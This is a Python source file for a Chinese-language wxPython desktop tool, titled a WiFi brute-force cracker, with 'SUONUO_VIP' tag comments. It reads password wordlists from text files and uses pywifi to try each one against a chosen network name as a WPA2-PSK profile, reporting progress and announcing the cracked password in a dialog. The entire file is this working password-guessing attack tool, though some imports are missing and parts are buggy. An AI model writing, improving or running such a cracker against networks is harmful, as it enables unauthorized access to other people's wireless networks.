# -*- coding:utf-8 -*- 
from threading import Thread
import wx
from pywifi import const



class Crack_Wifi(Thread):
    def __init__(self,SELFWX,paths_list,wifiname):
        Thread.__init__(self)
        self.__flag = threading.Event() # 用于暂停的标识
        self.__flag.set() # 设置为True
        self.__running = threading.Event() # 用于停止的标示
        self.__running.set()

        self.SELFWX = SELFWX
        self.paths_list = paths_list
        self.wifiname = wifiname
        self.start()

    def run(self):
        num_pwd = self.open_pwd_txt()
        while self.__running.isSet(): # 为True时立即返回, 为False时阻塞直到内部的标识位为True后返回
            self.__flag.wait()
            try:
                data = num_pwd.__next__().split('_')
                pwd = data[1]
                All_num = int(data[-1])
                num = int(data[0])
            except StopIteration:
                # 迭代有一定次数超额报错
                pass
            time.sleep(0.05)
            Get_Wifi = self.Get_Wifi(self.wifiname,pwd)
            if Get_Wifi:
                wx.CallAfter(pub.sendMessage,'linker',msg=[All_num,num+1,pwd.strip(),self.pwd_set_copy,'成功'])
                self.stop()
                dlg = wx.MessageDialog(self.SELFWX, "密码破解成功: %s !!"%pwd.strip(), "成功了！", wx.OK)
                dlg.ShowModal()
                dlg.Destroy()
            else:
                wx.CallAfter(pub.sendMessage,'linker',msg=[All_num,num+1,pwd.strip(),self.pwd_set_copy,'失败'])



    def open_pwd_txt(self):
        self.pwd_list = list()
        for path in self.paths_list:
            if path.split('\\')[-1].split('.')[-1] == 'txt':
                with open(path,'r') as pwd:
                    self.pwd_list += pwd.read().split('\n')
            else:
                dlg = wx.MessageDialog(self.SELFWX, "%s不是txt文本格式的密码本"%path.split('\\')[-1], "T_T", wx.OK)
                dlg.ShowModal()
                dlg.Destroy()
        # 去重
        self.pwd_set = set(self.pwd_list)
        self.pwd_set_copy = self.pwd_set.copy()
        for num,pwd in enumerate(self.pwd_set):
            if pwd == '':
                pass
            # print(num,pwd)
            yield str(num)+"_"+pwd+"_"+str(len(self.pwd_set))
            self.pwd_set_copy.remove(pwd)

# SUONUO_VIP

    # 暴力破解主函数
    def Get_Wifi(self,Wifi_name,pwd):
        # 抓取网卡接口
        wifi = pywifi.PyWiFi()
        # 获取第一个无限网卡
        ifaces = wifi.interfaces()[0]
        # 断开所有的连接
        ifaces.disconnect()
        time.sleep(1)
        # 更新wifi 状态不曾不会连接
        wifi_con_status = ifaces.status() # 0
        if wifi_con_status == const.IFACE_DISCONNECTED:
            # 创建wifi连接文件
            profile = pywifi.Profile()
            # 可能性要连接的wifi 名称
            profile.ssid = Wifi_name
            # 网卡的开放状态
            profile.auth = const.AUTH_ALG_OPEN # 0
            # wifi加密算法,一般wifi加密算法的wps
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # 加密单位
            profile.cipher = const.CIPHER_TYPE_CCMP
            # 调用密码
            profile.key = pwd
            #删除所有连接过的wifi文件
            ifaces.remove_all_network_profiles()
            # 设定新得连接文件
            tep_profile = ifaces.add_network_profile(profile)
            ifaces.connect(tep_profile)
            # wifi连接时间
            time.sleep(3)
            if ifaces.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False
        else:
            return "OK"


    def pause(self):
        self.__flag.clear() # 设置为False, 让线程阻塞

    def resume(self):
        self.__flag.set() # 设置为True, 让线程停止阻塞

    def stop(self):
        self.__flag.set() # 将线程从暂停状态恢复, 如何已经暂停的话
        self.__running.clear() # 设置为False 





class WifiForceBreak(wx.Frame):

    def __init__(self):
        wx.Frame.__init__(self,None,-1,"WIFI 暴力破解器",pos=(100,100),size=(440,430),
            style=wx.MINIMIZE_BOX | wx.MAXIMIZE_BOX | wx.RESIZE_BORDER | wx.SYSTEM_MENU | wx.CAPTION | wx.CLOSE_BOX | wx.CLIP_CHILDREN)
        self.ForceBreak()
        self.Show(True)


    def ForceBreak(self):
        File_select = wx.Button(self,-1,"选择密码本",pos=(5,5),size=(100,25))
        # wx.EVT_BUTTON 单击按钮时处理 事件
        File_select.Bind(wx.EVT_BUTTON,self.gettext,File_select)

        break_wifi = wx.Button(self,-1,"开始破解WiFi",pos=(110,5),size=(100,25))
        break_wifi.Bind(wx.EVT_BUTTON,self.break_wifi,break_wifi)

        con_break = wx.Button(self,-1,"继续破解",pos=(215,5),size=(100,25))
        con_break.Bind(wx.EVT_BUTTON,self.con_break,con_break)

        Enpty_data = wx.Button(self,-1,"清空文本",pos=(320,5),size=(100,25)) 
        Enpty_data.Bind(wx.EVT_BUTTON,self.Enpty_data,Enpty_data)

        wifi = wx.StaticText(self,-1,'wifi 名称:',pos=(10,40),size=(55,25))
        wifi.SetForegroundColour("blue")
        self.wifiname = wx.TextCtrl(self,-1,'',pos=(65,40),size=(350,20))

        Text = wx.StaticText(self,-1,'密码总数:',pos=(10,65),size=(100,25))
        Text.SetForegroundColour("red")
        self.text = wx.TextCtrl(self,-1,'',pos=(5,85),size=(85,25))

        Text2 = wx.StaticText(self,-1,'破解次数:',pos=(110,65),size=(100,25))
        Text2.SetForegroundColour("red")
        self.text2 = wx.TextCtrl(self,-1,'',pos=(110,85),size=(85,25))

        pwd_status = wx.StaticText(self,-1,'破解状态:',pos=(210,65),size=(100,25))
        pwd_status.SetForegroundColour("red")
        self.pwd_status = wx.TextCtrl(self,-1,'',pos=(210,85),size=(85,25))

        stop_break = wx.Button(self,-1,"暂停",pos=(310,65),size=(85,25))
        stop_break.Bind(wx.EVT_BUTTON,self.stop_break,stop_break)
        
        con_go = wx.Button(self,-1,"继续",pos=(310,95),size=(85,25))
        con_go.Bind(wx.EVT_BUTTON,self.con_go,con_go)


        Text3 = wx.StaticText(self,-1,'密码展示:',pos=(5,115),size=(100,25))
        Text3.SetForegroundColour("red")
        self.text3 = wx.TextCtrl(self,-1,'',pos=(5,135),size=(410,25))

        Text4 = wx.StaticText(self,-1,'文件选择信息:',pos=(5,185),size=(100,25))
        Text4.SetForegroundColour("red")

        self.path_text = wx.TextCtrl(self,-1,'',pos=(5,205),size=(410,175),style=wx.TE_MULTILINE | wx.TE_RICH2)        
        # 进度条
        self.gauge=wx.Gauge(self,1001,100,pos=(5,165),size=(410,15),style = wx.GA_SMOOTH)
        self.gauge.SetBezelFace(3)
        self.gauge.SetShadowWidth(3)

        # 中转函数 连接器
        pub.subscribe(self.Linker,"linker")
                

    def gettext(self,event):
        dlg = wx.FileDialog(self,"选择密码本",style=wx.FD_MULTIPLE) # FD_MULTIPLE 多选文件 FD_DEFAULT_STYLE 单选文件
        if dlg.ShowModal() == wx.ID_OK:
            # print(dir(dlg))
            # print(dlg.GetPath())
            path_list = dlg.GetPaths()
            self.paths_list = path_list # 文件列表
        try:
            paths = "\n".join([path.split('\\')[-1] for path in path_list])
        except UnboundLocalError:
            dlg = wx.MessageDialog(self, "请选择密码本", "G_G", wx.OK)
            dlg.ShowModal()
            dlg.Destroy()
            paths = ''
        self.path_text.SetLabel(paths)
        try:
            dlg.Destroy()
        except RuntimeError as RTE:
            pass


    def Linker(self,msg):
        # 接收要慢一步
        # print(msg)
        # 接受器
        try:
            self.gauge.SetValue(msg[1]/msg[0]*100)
            self.text.SetLabel(str(msg[0]))
            self.text2.SetLabel(str(msg[1]))
            self.text3.SetLabel(str(msg[2]))
            self.pwd_status.SetLabel(str(msg[-1]))
        except RuntimeError as RTE:
            # print(msg[0],msg[1],msg[2])
            print(len(msg[3]))
            # 退出线程
            try:
                Con_txt = open('Continue.txt','wb+')
                print(len(msg[3]))
                Con_txt.write(str(msg[3]).encode('utf-8'))
                # for pwd in msg[3]:
                #     Con_txt.write(pwd.encode('utf-8'))
                #     Con_txt.write('\n'.encode('utf-8'))
                # Con_txt.close()
            except RuntimeError as RTE:
                os._exit(0)
            os._exit(0)
            # self.xx.stop()

    def break_wifi(self,event):
        wifiname = self.wifiname.GetValue()
        if wifiname:
            try:
                paths_list = self.paths_list
            except AttributeError as ATBE:
                # print(self)
                dlg = wx.MessageDialog(self, "你还没有选择密码本", "G_G", wx.OK)
                dlg.ShowModal()
                dlg.Destroy()
            else:
                # 导入主程序和文件列表
                self.xx = Crack_Wifi(self,paths_list,wifiname)
        else:
            dlg = wx.MessageDialog(self, "请输入wifi名称", "P_P", wx.OK)
            dlg.ShowModal()
            dlg.Destroy()

    def con_break(self,event):
        pass

    def Enpty_data(self,event):
        pass

    # 暂停子程序
    def stop_break(self,event):
        try:
            self.xx.pause()
        except AttributeError:
            dlg = wx.MessageDialog(self, "请先开始破解WiFi","X_X", wx.OK)
            dlg.ShowModal()
            dlg.Destroy()

    # 继续子程序
    def con_go(self,event):
        try:
            self.xx.resume()
        except AttributeError:
            dlg = wx.MessageDialog(self, "请先开始破解WiFi","X_X", wx.OK)
            dlg.ShowModal()
            dlg.Destroy()


# SUONUO_VIP
if __name__ == "__main__":
    app = wx.App()
    Frame = WifiForceBreak()
    app.MainLoop()  # 循环监听事件
    

    # f = open('Continue.txt','r')
    # xx = f.read()
    # z = 0
    # for x in xx.split(','):
    #     print(x.replace("'",'').strip().replace("{",'').replace("}",''))
    #     # print(z)
    #     z += 1